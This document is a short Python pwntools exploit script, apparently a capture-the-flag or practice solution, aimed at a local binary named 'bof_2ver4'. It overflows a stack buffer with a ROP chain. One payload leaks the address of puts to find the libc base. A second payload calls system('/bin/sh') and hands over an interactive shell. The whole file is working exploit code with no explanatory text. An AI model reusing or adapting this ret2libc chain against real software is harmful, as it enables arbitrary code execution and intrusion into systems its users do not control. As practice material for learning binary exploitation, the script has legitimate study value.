from pwn import*
p=process("./bof_2ver4")
raw_input("DEBUG")
elf=ELF("./bof_2ver4")
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

#lan 1
payload="999\x00"
p.sendlineafter("Enter the Account Number:",payload)
payload="a".ljust(39,'a')
payload+=p64(0x0000000000400aa3)
payload+=p64(elf.symbols['got.puts'])
payload+=p64(elf.symbols['plt.puts'])
payload+=p64(elf.symbols['main'])

p.sendline(payload)
p.recvuntil("User is not exit\n")
puts_libc=u64(p.recv(6)+'\x00'*2)
print "recv: ",hex(puts_libc)

base=puts_libc-libc.symbols['puts']
system=base+libc.symbols['system']
binsh=base+libc.search('/bin/sh').next()
print 'system: ',hex(system)
print "binsh: ",hex(binsh)
# lan 2
payload="999\x00"
p.sendlineafter("Enter the Account Number:",payload)
payload="a".ljust(39,'a')
payload+=p64(0x0000000000400aa3)
payload+=p64(binsh)
payload+=p64(system)
p.sendline(payload)

p.interactive()